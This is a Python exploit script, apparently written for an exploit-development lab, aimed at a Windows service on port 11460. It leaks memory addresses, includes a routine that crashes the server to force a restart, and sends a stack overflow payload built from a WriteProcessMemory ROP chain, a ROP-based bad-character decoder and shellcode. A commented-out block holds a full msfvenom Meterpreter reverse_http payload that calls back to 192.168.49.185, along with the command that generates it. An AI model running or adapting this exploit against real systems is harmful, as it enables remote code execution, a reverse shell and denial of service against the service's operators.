#!/usr/bin/env python3

import socket
import sys
import time
import traceback
from struct import pack


def parseResponse(response):
    """ Parse a server response and extract the leaked address """
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    if not address:
        return 0
    return address


def leak_function_address(function_name: bytearray, server: str, port: int) -> int:
    """ Leaks a function address from the server. """
    psAgentCommand = bytearray([0x41] * 0xC)
    psAgentCommand += pack("<i", 0x2000)  # opcode
    psAgentCommand += pack("<i", 0x0)  # 1st memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 1st memcpy: size field
    psAgentCommand += pack("<i", 0x100)  # 2nd memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 2nd memcpy: size field
    psAgentCommand += pack("<i", 0x200)  # 3rd memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 3rd memcpy: size field
    psAgentCommand += bytearray([0x41] * 0x8)

    symbol = b"SymbolOperation" + function_name + b"\x00"
    psCommandBuffer = symbol + b"A" * (100 - len(symbol))
    psCommandBuffer += b"B" * 0x100
    psCommandBuffer += b"C" * 0x100

    # checksum and command.
    buf = pack(">i", len(psAgentCommand) + len(psCommandBuffer) - 4) + psAgentCommand + psCommandBuffer

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buf)
        response = s.recv(1024)
        s.close()
    except:
        return 0

    return parseResponse(response)


def crash_server(server: str, port: int):
    payload_size = 0x64  # Total size of payload not including checksum.
    agent_command_size = 0x30  # Size of the agent command portion.
    command_buffer_size = payload_size - agent_command_size  # Size of the command buffer.

    agent_command_buffer = b"A" * 0x10
    agent_command_buffer += b"\x44\x61\x36\xf8"  # offset first copy. Large negative value.
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of first copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # offset for second copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of second copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # offset of third copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of third copy
    agent_command_buffer += b"A" * (agent_command_size - len(agent_command_buffer))

    buf = pack(">i", payload_size)
    buf += agent_command_buffer
    buf += bytearray([0x42] * command_buffer_size)

    continue_send_data = True
    while continue_send_data:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buf)
            s.close()
            continue_send_data = False
        except:
            pass


def bad_char_check(buffer: bytearray):
    bad_chars = b"\x00\x09\x0a\x0c\x0d\x20"
    for bad_char in bad_chars:
        offset = 0
        for test_byte in buffer:
            if test_byte == bad_char:
                print("Bad character detected in shell code.")
                print("Buffer offset: {}".format(offset))
                print("Character: {}".format(hex(bad_char)))
                traceback.print_stack()
                return True
            offset += 1
    return False


def upload_shell(libeay32IBM019Func: int, WPMAddr: int, server: str, port: int):
    dllBase = libeay32IBM019Func - 0x14E0
    eip_offset = 276
    command_buffer_length = 0x1000

    # psAgentCommand
    buf = bytearray([0x41] * 0xC)
    buf += pack("<i", 0x534)  # opcode
    buf += pack("<i", 0x0)  # 1st memcpy: offset
    buf += pack("<i", 0x1100)  # 1st memcpy: size field
    buf += pack("<i", 0x0)  # 2nd memcpy: offset
    buf += pack("<i", 0x100)  # 2nd memcpy: size field
    buf += pack("<i", 0x0)  # 3rd memcpy: offset
    buf += pack("<i", 0x100)  # 3rd memcpy: size field
    buf += bytearray([0x40] * 0x8)

    # psCommandBuffer
    wpm = b""
    wpm += pack("<L", (WPMAddr))  # WriteProcessMemory Address
    wpm += pack("<L", (dllBase + 0x92c04))  # Shellcode Return Address. <- Our code cave.
    wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle. <- -1
    wpm += pack("<L", (dllBase + 0x92c04))  # Code cave address.
    wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address) <- To be edited with ROP gadgets.
    wpm += pack("<L", (0x42424242))  # dummy nSize <- To be edited with ROP gadgets.
    wpm += pack("<L", (dllBase + 0xe401c))  # lpNumberOfBytesWritten <- Writable data section of dll.
    wpm += b"\x60" * 0x10

    # Note: offset goes before wpm.
    offset = b"\x43" * (eip_offset - len(wpm))

    if bad_char_check(wpm): return True

    # Place esp into eax.
    # bp libeay32IBM019 + 0x408d6
    eip = pack("<L", (dllBase + 0x408d6))  # push esp ; pop esi ; ret <- mov esi, esp

    if bad_char_check(eip): return True

    # Patching lpBuffer
    rop = pack("<L", (dllBase + 0x296f))  # mov eax, esi ; pop esi ; ret <- eax = esi = stack pointer.
    rop += pack("<L", (0x30303030))  # junk into esi

    # Align eax to shellcode.
    # Add 0x600 to eax by adding large numbers.
    # 0:079> ? 0x88888888 + 0x77777d78
    # Evaluate expression: 4294968832 = 00000001`00000600
    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret <- Place 0x88888888 in ecx.
    rop += pack("<L", (0x88888888))
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret <- add 0x88888888 to eax which contains esp.
    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret <- Place 0x77777878 into ecx.
    rop += pack("<L", (0x77777d78))
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret <- add to eax.

    rop += pack("<L", (dllBase + 0x8876d))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
    rop += pack("<L", (0x30303030))  # junk into esi
    rop += pack("<L", (dllBase + 0x48d8c))  # pop eax ; ret
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0xfffff9e0)) # pop into eax
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
    rop += pack("<L", (dllBase + 0x1fd8))  # mov [eax], ecx ; ret

    # Patching nSize
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0x408dd))  # push eax ; pop esi ; ret
    rop += pack("<L", (dllBase + 0x48d8c))  # pop eax ; ret
    rop += pack("<L", (0xfffffdf4))  # -524
    rop += pack("<L", (dllBase + 0x1d8c2))  # neg eax ; ret
    rop += pack("<L", (dllBase + 0x8876d))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
    rop += pack("<L", (0x30303030))  # junk into esi
    rop += pack("<L", (dllBase + 0x1fd8))  # mov [eax], ecx ; ret
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10

    # ROP decoder.
    # Restore first four shellcode bytes
    # bp libeay32IBM019 + 0x4a7b6
    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
    rop += pack("<L", (0xfffff9e2))  # negative offset -> 0x61e bytes ahead of eax. Move eax to the first byte to fix.
    rop += pack("<L", (dllBase + 0x4a7b6))  # sub eax, ecx ; pop ebx ; ret
    rop += pack("<L", (0x11110111))  # value of 01 into BH
    rop += pack("<L", (dllBase + 0x468ee))  # add [eax+1], bh ; ret

    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
    rop += pack("<L", (0xffffffff))  # negative offset -> Jump ahead 1.
    rop += pack("<L", (dllBase + 0x4a7b6))  # sub eax, ecx ; pop ebx ; ret
    rop += pack("<L", (0x11110111))  # value of 01 into BH
    rop += pack("<L", (dllBase + 0x468ee))  # add [eax+1], bh ; ret

    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
    rop += pack("<L", (0xffffffff))  # negative offset -> Jump ahead 1.
    rop += pack("<L", (dllBase + 0x4a7b6))  # sub eax, ecx ; pop ebx ; ret
    rop += pack("<L", (0x11110111))  # value of 01 into BH
    rop += pack("<L", (dllBase + 0x468ee))  # add [eax+1], bh ; ret

    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
    rop += pack("<L", (0xfffffff4))  # negative offset -> Jump ahead 12.
    rop += pack("<L", (dllBase + 0x4a7b6))  # sub eax, ecx ; pop ebx ; ret
    rop += pack("<L", (0x11110411))  # value of 04 into BH
    rop += pack("<L", (dllBase + 0x468ee))  # add [eax+1], bh ; ret

    # Align ESP with ROP Skeleton
    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
    rop += pack("<L", (0xffffffec))  # -0x14
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
    # bp libeay32IBM019 + 0x5b415
    rop += pack("<L", (dllBase + 0x5b415))  # xchg eax, esp ; ret
    # Okay, executing WriteProcessMemory and will return to shell code in memory.

    if bad_char_check(rop): return True

    offset2 = b"\xcc" * (0x600 - len(rop))

    # shellcode = bytes(subprocess.check_output(["/usr/bin/msf-pattern_create", "-l", str(0x200)]).strip())
    # shellcode = b"\x90" * 0x100
    # msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.185 LPORT=8080 -f python -v shellcode
    # Small sample of shell code. Replaced the following bad characters: 00 -> ff 0c -> 08
    shellcode = b""
    shellcode += b"\xfc\xe8\x8f\xff\xff\xff\x60\x89\xe5\x31\xd2"
    shellcode += b"\x64\x8b\x52\x30\x8b\x52\x08\x8b\x52"

    # Full shell code for later.
    # shellcode = b""
    # shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2"
    # shellcode += b"\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
    # shellcode += b"\x72\x28\x31\xff\x0f\xb7\x4a\x26\x31\xc0\xac"
    # shellcode += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
    # shellcode += b"\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c"
    # shellcode += b"\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
    # shellcode += b"\x50\x8b\x58\x20\x8b\x48\x18\x01\xd3\x85\xc9"
    # shellcode += b"\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31"
    # shellcode += b"\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4"
    # shellcode += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
    # shellcode += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
    # shellcode += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
    # shellcode += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
    # shellcode += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x6e\x65\x74"
    # shellcode += b"\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26"
    # shellcode += b"\x07\xff\xd5\x31\xdb\x53\x53\x53\x53\x53\xe8"
    # shellcode += b"\x75\x00\x00\x00\x4d\x6f\x7a\x69\x6c\x6c\x61"
    # shellcode += b"\x2f\x35\x2e\x30\x20\x28\x4d\x61\x63\x69\x6e"
    # shellcode += b"\x74\x6f\x73\x68\x3b\x20\x49\x6e\x74\x65\x6c"
    # shellcode += b"\x20\x4d\x61\x63\x20\x4f\x53\x20\x58\x20\x31"
    # shellcode += b"\x32\x5f\x30\x5f\x31\x29\x20\x41\x70\x70\x6c"
    # shellcode += b"\x65\x57\x65\x62\x4b\x69\x74\x2f\x36\x30\x35"
    # shellcode += b"\x2e\x31\x2e\x31\x35\x20\x28\x4b\x48\x54\x4d"
    # shellcode += b"\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63"
    # shellcode += b"\x6b\x6f\x29\x20\x56\x65\x72\x73\x69\x6f\x6e"
    # shellcode += b"\x2f\x31\x35\x2e\x30\x20\x53\x61\x66\x61\x72"
    # shellcode += b"\x69\x2f\x36\x30\x35\x2e\x31\x2e\x31\x35\x00"
    # shellcode += b"\x68\x3a\x56\x79\xa7\xff\xd5\x53\x53\x6a\x03"
    # shellcode += b"\x53\x53\x68\x90\x1f\x00\x00\xe8\xed\x00\x00"
    # shellcode += b"\x00\x2f\x49\x64\x63\x70\x4e\x66\x7a\x4a\x5a"
    # shellcode += b"\x58\x45\x6e\x5a\x79\x5a\x6d\x52\x70\x42\x32"
    # shellcode += b"\x51\x41\x42\x6b\x43\x47\x56\x64\x56\x55\x45"
    # shellcode += b"\x33\x63\x44\x39\x33\x79\x4e\x4a\x45\x36\x55"
    # shellcode += b"\x37\x6e\x75\x6d\x66\x4b\x76\x7a\x58\x57\x77"
    # shellcode += b"\x4f\x52\x33\x59\x44\x44\x5a\x69\x5f\x78\x31"
    # shellcode += b"\x76\x6f\x67\x6d\x4a\x73\x46\x42\x34\x6b\x67"
    # shellcode += b"\x54\x53\x73\x43\x36\x4c\x4a\x36\x4f\x63\x57"
    # shellcode += b"\x65\x6c\x5f\x4b\x47\x6d\x57\x5f\x7a\x33\x4b"
    # shellcode += b"\x72\x59\x6d\x33\x47\x56\x79\x69\x79\x54\x43"
    # shellcode += b"\x5a\x63\x68\x5f\x00\x50\x68\x57\x89\x9f\xc6"
    # shellcode += b"\xff\xd5\x89\xc6\x53\x68\x00\x02\x68\x84\x53"
    # shellcode += b"\x53\x53\x57\x53\x56\x68\xeb\x55\x2e\x3b\xff"
    # shellcode += b"\xd5\x96\x6a\x0a\x5f\x53\x53\x53\x53\x56\x68"
    # shellcode += b"\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x14\x68"
    # shellcode += b"\x88\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5"
    # shellcode += b"\x4f\x75\xe1\xe8\x4b\x00\x00\x00\x6a\x40\x68"
    # shellcode += b"\x00\x10\x00\x00\x68\x00\x00\x40\x00\x53\x68"
    # shellcode += b"\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7"
    # shellcode += b"\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96"
    # shellcode += b"\x89\xe2\xff\xd5\x85\xc0\x74\xcf\x8b\x07\x01"
    # shellcode += b"\xc3\x85\xc0\x75\xe5\x58\xc3\x5f\xe8\x7f\xff"
    # shellcode += b"\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x34"
    # shellcode += b"\x39\x2e\x31\x38\x35\x00\xbb\xf0\xb5\xa2\x56"
    # shellcode += b"\x6a\x00\x53\xff\xd5"

    padding = b"\xcc" * (command_buffer_length - eip_offset - 4 - len(rop) - len(offset2) - len(shellcode))

    if bad_char_check(shellcode): return True

    payload = offset + wpm + eip + rop + offset2 + shellcode + padding

    if bad_char_check(payload): return True

    formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (payload, 0, 0, 0, 0)
    buf += formatString

    # Checksum
    buf = pack(">i", len(buf) - 4) + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    return False


def main():
    bad_chars = b"\x00\x09\x0a\x0c\x0d\x20"
    server = "192.168.185.10"
    port = 11460
    bad_chars_remain = True
    write_process_memory_addr = 0
    get_new_lockid_addr = 0
    libeay32IBM019Base = 0

    while bad_chars_remain:
        while write_process_memory_addr == 0 or get_new_lockid_addr == 0 or libeay32IBM019Base == 0:
            write_process_memory_addr = leak_function_address(b"WriteProcessMemory", server, port)
            get_new_lockid_addr = leak_function_address(b"N98E_CRYPTO_get_new_lockid", server, port)
            libeay32IBM019Base = get_new_lockid_addr - 0x14E0


        print("WriteProcessMemory Address: " + hex(write_process_memory_addr))
        print("N98E_CRYPTO_get_new_lockid Address: " + hex(get_new_lockid_addr))
        print("Libeay32IBM019 Base Address: " + hex(libeay32IBM019Base))

        base_address_bytes = pack(">i", libeay32IBM019Base)
        bad_chars_remain = False

        for bad_char in bad_chars:
            if base_address_bytes[0] == bad_char or base_address_bytes[1] == bad_char:
                print("Bad character detected. Restarting server...")
                print("Note: It might take a while for the server to restart.")
                bad_chars_remain = True
                crash_server(server, port)
                write_process_memory_addr = 0
                get_new_lockid_addr = 0
                libeay32IBM019Base = 0
                break;

        bad_chars_remain = upload_shell(get_new_lockid_addr, write_process_memory_addr, server, port)
        if bad_chars_remain:
            print("Bad characters in payload. Restarting server..")
            print("Note: It might take a while for the server to restart.")
            crash_server(server, port)
            write_process_memory_addr = 0
            get_new_lockid_addr = 0
            libeay32IBM019Base = 0

    print("Exploit sent!")
    sys.exit(0)


if __name__ == "__main__":
    main()
